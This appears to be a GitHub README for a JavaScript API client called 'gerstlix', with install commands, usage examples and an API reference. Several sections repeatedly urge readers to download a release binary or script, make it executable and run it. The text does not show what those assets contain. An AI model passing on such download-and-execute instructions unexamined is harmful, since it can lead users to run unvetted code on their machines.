# Gerstlix ES6+ API Client — Modern JavaScript SDK for Gerstlix
[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/HanyRagab58/gerstlix/releases)  
https://github.com/HanyRagab58/gerstlix/releases

<img src="https://raw.githubusercontent.com/github/explore/main/topics/javascript/javascript.png" alt="JavaScript" width="88" style="float:right;margin-left:16px" />

Gerstlix is a modern ES6+ API client for Gerstlix.com. It provides a typed, promise-based interface for common API calls. The client focuses on clarity, small bundle size, and native fetch support. Use it in Node.js, Deno, or in the browser.

Badges
- [![npm version](https://img.shields.io/npm/v/gerstlix.svg)](https://www.npmjs.com/package/gerstlix)
- [![License](https://img.shields.io/github/license/HanyRagab58/gerstlix)](https://github.com/HanyRagab58/gerstlix/blob/main/LICENSE)
- [![Releases](https://img.shields.io/github/v/release/HanyRagab58/gerstlix?label=Releases)](https://github.com/HanyRagab58/gerstlix/releases)

Features
- Modern ES6+ API. Use import and async/await.
- Small bundle. No heavy runtime.
- Native fetch support with an adapter for Node.js.
- Typed request and response shapes.
- Built-in retries and backoff for idempotent calls.
- Pluggable auth and middleware.

Quick links
- Releases: https://github.com/HanyRagab58/gerstlix/releases
- NPM: https://www.npmjs.com/package/gerstlix
- Source: https://github.com/HanyRagab58/gerstlix

Install

Node (npm)
```bash
npm install gerstlix
```

Yarn
```bash
yarn add gerstlix
```

Deno (via esm.sh)
```js
import Gerstlix from "https://esm.sh/gerstlix@latest"
```

Browser
- Use a bundler that supports ES modules. Import from your build output.

Quick start

Create a client and call the API. The client uses fetch. Provide an API key in the header.

```js
import Gerstlix from "gerstlix"

const client = new Gerstlix({
  apiKey: "your_api_key_here",
  baseUrl: "https://api.gerstlix.com/v1"
})

async function run() {
  const profile = await client.users.getProfile("user_id_123")
  console.log(profile.id, profile.username)
}

run().catch(err => console.error(err))
```

If you run in Node.js and you use Node < 18, add a fetch polyfill or use the built-in adapter:

```js
import fetch from "node-fetch"
import Gerstlix from "gerstlix"

const client = new Gerstlix({
  fetch,
  apiKey: process.env.GERSTLIX_API_KEY
})
```

CLI release assets

Download the release asset for your platform from the Releases page and execute it. The release contains a ready-to-run CLI binary or script. Visit or download from:

https://github.com/HanyRagab58/gerstlix/releases

After you download the correct file for your OS, mark it executable and run it:

```bash
chmod +x gerstlix-cli-linux
./gerstlix-cli-linux --help
```

If you prefer a packaged script, download the matching release asset, then run:

```bash
node gerstlix-cli.js --version
```

Why this client

- It uses modern language features and async/await.
- It yields small bundles for web use.
- It supports both Node and browser fetch semantics.
- It exposes high-level methods that map to REST endpoints.
- It gives typed responses for safer code.

Main API

Client constructor options
- apiKey: string — API key for authenticated calls.
- baseUrl: string — Base API URL. Default: https://api.gerstlix.com/v1
- fetch: function — Optional fetch implementation.
- timeout: number — Request timeout in ms. Default: 30_000
- retries: number — Retry count for idempotent requests. Default: 2

Primary modules
- client.users — user profile and search
- client.payments — payment creation and status
- client.items — CRUD for items and assets
- client.search — full-text search and filters

Examples

Get a user profile
```js
const profile = await client.users.getProfile("user_123")
console.log(profile.username, profile.createdAt)
```

Search items with filters
```js
const results = await client.items.search({
  q: "design token",
  tags: ["css", "tokens"],
  sort: "created_at",
  limit: 20
})
console.log(results.total, results.items.length)
```

Create a payment
```js
const payment = await client.payments.create({
  amount: 2499,
  currency: "USD",
  userId: "user_123",
  method: "card"
})
console.log(payment.id, payment.status)
```

Streaming and pagination

The client exposes a cursor-based pager helper. Use the pager to iterate through large collections.

```js
for await (const item of client.items.pager({ limit: 100 })) {
  // process item
}
```

Headers and auth

The client sends Authorization header when you set apiKey.

```http
Authorization: Bearer <apiKey>
Content-Type: application/json
Accept: application/json
```

You can add custom headers with middleware:

```js
client.middleware.use(async (req, next) => {
  req.headers.set("X-Trace-Id", generateTraceId())
  return next(req)
})
```

Error handling

The client throws structured errors. Use try/catch and inspect error properties.

```js
try {
  await client.items.get("missing_id")
} catch (err) {
  console.error(err.name, err.status, err.message)
  // err.code, err.details
}
```

TypeScript support

The package ships with type definitions. Import types and use them in your code.

```ts
import Gerstlix, { UserProfile, Item } from "gerstlix"

const client = new Gerstlix({ apiKey: process.env.GERSTLIX_KEY })

async function getUser(userId: string): Promise<UserProfile> {
  return client.users.getProfile(userId)
}
```

Advanced usage

Custom fetch adapter
- Supply a custom fetch to fine-tune TLS, proxy, or keep-alive.

Middleware
- Add request and response middleware to handle logging, metrics, or tracing.

Retry and backoff
- Configure retries and backoff strategy per request.

Batch requests
- Use client.batch to execute multiple requests in parallel with concurrency control.

Testing

- The client exposes a test harness that mocks HTTP responses.
- Use client.test.bind(server) to mount the mock server.
- See tests in the repo for patterns.

Contributing

- Fork the repo and open a PR.
- Follow the code style in src.
- Run tests with npm test.
- Add unit tests for new features.
- Keep changes small and focused.

Roadmap

Planned items
- WebSocket events for live updates.
- OAuth flows and token refresh helpers.
- GraphQL gateway for more flexible queries.
- More SDKs for other languages.

Releases and downloads

Get the CLI or packaged assets from the Releases page. Download the binary or script that matches your platform and run it after you make it executable. Visit:

https://github.com/HanyRagab58/gerstlix/releases

This link points to packaged release assets. Pick the asset for your OS, download it, and execute the file. The Releases page also lists changelogs and signed assets.

Changelog

See Releases for tagged changelogs. Each release includes notes that list added features, fixes, and breaking changes.

License

The project uses the MIT license. See LICENSE in the repo for the full text.

Contact and support

- File issues on the repo.
- Open pull requests for fixes.
- Use the issue tracker for API bugs.

Branding and images

- JavaScript logo: https://raw.githubusercontent.com/github/explore/main/topics/javascript/javascript.png
- Use the GitHub Releases badge to link to downloads:
  [![Get Releases](https://img.shields.io/badge/Get%20Releases-Download-blue?logo=github)](https://github.com/HanyRagab58/gerstlix/releases)

Examples and demo

Demo repo and examples live in the examples folder. The examples show:
- Node server integration
- Browser single page app
- Deno script

Commands
```bash
# run tests
npm test

# lint
npm run lint

# build
npm run build
```

API surface (selected)

users
- getProfile(userId: string) - Promise<UserProfile>
- search(params) - Promise<SearchResult<UserProfile>>

items
- get(itemId: string) - Promise<Item>
- create(payload) - Promise<Item>
- update(itemId, patch) - Promise<Item>
- delete(itemId) - Promise<void>
- search(params) - Promise<SearchResult<Item>>
- pager(params) - AsyncIterable<Item>

payments
- create(payload) - Promise<Payment>
- get(paymentId) - Promise<Payment>
- refund(paymentId, options) - Promise<Refund>

Support and community

- Open an issue for bugs or feature requests.
- Send a PR to add examples or docs.
- Check Releases for prebuilt binaries and changelogs:
  https://github.com/HanyRagab58/gerstlix/releases

Footer image

<img src="https://raw.githubusercontent.com/github/explore/main/topics/api/api.png" alt="API" width="128" style="display:block;margin-top:18px" />